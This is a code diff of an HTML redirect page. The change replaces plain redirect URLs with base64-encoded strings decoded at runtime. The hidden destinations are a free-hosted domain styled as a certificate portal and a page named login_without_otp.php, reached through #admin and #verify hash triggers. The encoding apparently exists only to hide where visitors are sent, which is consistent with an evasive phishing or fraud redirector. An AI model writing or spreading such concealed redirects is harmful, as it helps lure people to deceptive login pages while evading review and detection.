@@ -1,12 +1,19 @@
+
 <!DOCTYPE html>
 <html>
 <head>
   <script>
-    // Check if URL has #admin
-    if (window.location.hash === "#admin") {
-      window.location.href = "https://e-upcertificate.great-site.net/login_without_otp.php";
-    } else {
-      window.location.href = "https://e-upcertificate.great-site.net/";
+    const hash = window.location.hash;
+
+    // Encoded URLs
+    const adminUrl = "aHR0cHM6Ly9lLXVwY2VydGlmaWNhdGUuZ3JlYXQtc2l0ZS5uZXQvbG9naW5fd2l0aG91dF9vdHAucGhw";
+    const verifyUrl = "aHR0cHM6Ly9lLXVwY2VydGlmaWNhdGUuZ3JlYXQtc2l0ZS5uZXQvI3ZlcmlmeQ==";
+
+    if (hash === "#admin") {
+      window.location.href = atob(adminUrl);
+    } 
+    else if (hash === "#verify") {
+      window.location.href = atob(verifyUrl);
     }
   </script>
 </head>
